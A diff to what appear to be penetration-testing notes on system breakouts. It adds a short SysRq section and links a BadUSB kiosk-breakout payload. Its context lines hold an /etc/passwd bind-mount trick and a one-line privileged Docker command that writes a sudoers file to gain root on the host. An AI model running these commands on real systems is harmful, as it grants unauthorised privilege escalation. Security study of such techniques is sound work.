@@ -97,6 +97,12 @@ End Sub
   - We can create our own version and put it in `/tmp/passwd` and then run `sudo mount -o bind /tmp/passwd /etc/passwd`
   - Now, anything that reads `/etc/passwd` will read our version, even though actual `/etc/passwd` is unchanged
 
+**SysRq**
+- Debugging tool to send commands directly to the kernel 
+  - Intended to help recover from frozen systems, reboot safely, or simply unstuck yourself
+- The [Wikipedia page on it](https://en.wikipedia.org/wiki/Magic_SysRq_key) goes into detail about each of the combinations
+- This is supported in the [Kiosk Breakout Script](https://github.com/KhaelK138/badusb-windows-kiosk-breakout/blob/main/breakout_payload.txt)
+
 ## Docker
 
 Shai Hulud breakout payload: `docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"`
